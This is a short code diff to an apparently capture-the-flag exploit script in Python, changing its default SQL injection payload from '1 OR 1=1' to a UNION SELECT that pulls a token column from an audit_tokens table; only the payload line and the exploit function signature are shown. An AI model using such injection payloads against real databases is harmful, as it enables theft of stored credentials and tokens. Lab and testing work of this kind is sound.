@@ -4,7 +4,7 @@ import sys
 
 import requests
 
-DEFAULT_PAYLOAD = "1 OR 1=1"
+DEFAULT_PAYLOAD = "1 UNION SELECT 999, 'flag', token FROM audit_tokens"
 
 
 def exploit(base_url: str, payload: str = DEFAULT_PAYLOAD) -> bool:
